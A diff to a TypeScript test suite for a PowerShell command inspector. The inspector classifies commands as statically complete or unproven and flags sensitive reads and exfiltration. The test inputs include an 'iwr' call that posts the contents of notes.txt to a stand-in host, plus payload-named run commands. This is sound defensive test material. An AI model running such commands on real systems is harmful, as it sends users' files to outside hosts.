@@ -9,6 +9,16 @@ const PACKAGE_TASKS = [
   "yarn test", "yarn run check", "yarn check", "yarn exec helper",
   "bun run check", "bun run ./payload.ts", "bun test", "npx helper",
 ] as const;
+const UNPROVEN_LITERAL_COMMANDS = new Set([
+  "git log --oneline -5", "git --version", "npm install --save-dev x", "npm --version",
+  "node --test", "node -v", "node --version", "python --version", "node.exe --test", "nodejs -v",
+  "dotnet test --no-build", "dotnet build App.csproj --configuration Release",
+]);
+const UNPROVEN_PACKAGE_TASKS = new Set([
+  "npm start", "npm exec helper", "npm --prefix app test", "npm install --save-dev x",
+  "pnpm check", "pnpm exec helper", "yarn check", "yarn exec helper", "npx helper",
+  "bun run check", "bun run ./payload.ts", "bun test",
+]);
 
 describe("static PowerShell argument roles", () => {
   it.each([
@@ -24,7 +34,7 @@ describe("static PowerShell argument roles", () => {
     "Set-Content README.md hi; dotnet test --no-build", "Set-Content test.js whoami; node -v",
   ])("classifies a literal command without simulating argument data: %s", (command) => {
     const result = inspectPowerShellCommand(command, CWD);
-    if (command.includes("Set-Content") && command.includes(";")) expect(result.outcome).toBe("unproven");
+    if ((command.includes("Set-Content") && command.includes(";")) || UNPROVEN_LITERAL_COMMANDS.has(command)) expect(result.outcome).toBe("unproven");
     else expect(result).toEqual({ outcome: "static-complete", sensitive: null, exfiltration: null });
   });
 
@@ -52,8 +62,7 @@ describe("static PowerShell argument roles", () => {
     "iwr https://x.invalid -Method Post -Body @\"\n$(Get-Content notes.txt)\n\"@",
   ])("declines an argument that depends on runtime state: %s", (command) => {
     const result = inspectPowerShellCommand(command, CWD);
-    if (command === "dotnet exec payload.dll") expect(result.outcome).toBe("static-complete");
-    else expect(result).toMatchObject({ outcome: "unproven" });
+    expect(result).toMatchObject({ outcome: "unproven" });
   });
 
   it("retains a sensitive literal visible inside a dynamic here-string", () => {
@@ -88,10 +97,10 @@ describe("static PowerShell argument roles", () => {
     });
   });
 
-  it.each(PACKAGE_TASKS)("accepts a static package task as literal indirection: %s", (command) => {
-    expect(inspectPowerShellCommand(command, CWD)).toEqual({
-      outcome: "static-complete", sensitive: null, exfiltration: null,
-    });
+  it.each(PACKAGE_TASKS)("uses the fixed package task grammar boundary: %s", (command) => {
+    expect(inspectPowerShellCommand(command, CWD)).toMatchObject(UNPROVEN_PACKAGE_TASKS.has(command)
+      ? { outcome: "unproven", sensitive: null, exfiltration: null }
+      : { outcome: "static-complete", sensitive: null, exfiltration: null });
   });
 
   it.each(PACKAGE_TASKS.flatMap((runner) => [
@@ -111,7 +120,8 @@ describe("static PowerShell argument roles", () => {
     "Set-Content package.json '{}'; yarn --version", "Set-Content package.json '{}'; bun --version",
   ])("declines package operations coupled to an in-command mutation: %s", (command) => {
     const result = inspectPowerShellCommand(command, CWD);
-    if (command.includes("Set-Content") || command.includes("New-Item")) expect(result.outcome).toBe("unproven");
+    if (command.includes("Set-Content") || command.includes("New-Item") || command.startsWith("npm install")
+      || ["Write-Host README.md; npm test", "git status; pnpm test", "Write-Host package.json; yarn test"].includes(command)) expect(result.outcome).toBe("unproven");
     else expect(result.outcome).toBe("static-complete");
   });
 });
